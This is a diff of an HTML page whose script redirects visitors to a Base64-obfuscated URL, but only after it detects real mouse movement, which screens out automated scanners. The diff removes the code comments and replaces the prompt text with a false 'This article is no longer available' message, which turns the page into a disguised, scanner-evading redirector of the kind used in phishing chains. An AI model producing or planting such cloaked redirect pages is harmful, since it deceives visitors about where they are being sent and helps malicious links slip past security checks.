@@ -9,24 +9,23 @@
 
         function detectMouseMovement(event) {
             if (!hasRedirected) {
-                // Check for natural mouse movement by analyzing properties like speed and direction
                 if (event.movementX !== 0 || event.movementY !== 0) {
-                    hasRedirected = true; // Prevent multiple redirects
-                    redirectUser(); // Trigger the redirect
+                    hasRedirected = true;
+                    redirectUser();
                 }
             }
         }
 
         function redirectUser() {
-            const encodedUrl = "aHR0cHM6Ly93d3cuZmluYWxkZXN0aW5hdGlvbi5jb20="; // Base64 encoded URL
-            const decodedUrl = atob(encodedUrl); // Decode the URL
-            window.location.href = decodedUrl; // Perform the redirect
+            const encodedUrl = "aHR0cHM6Ly93d3cuZmluYWxkZXN0aW5hdGlvbi5jb20=";
+            const decodedUrl = atob(encodedUrl);
+            window.location.href = decodedUrl;
         }
 
         document.addEventListener("mousemove", detectMouseMovement);
     </script>
 </head>
 <body>
-    <p>Move your mouse to proceed to the next page.</p>
+    <p>This article is no longer available</p>
 </body>
 </html>
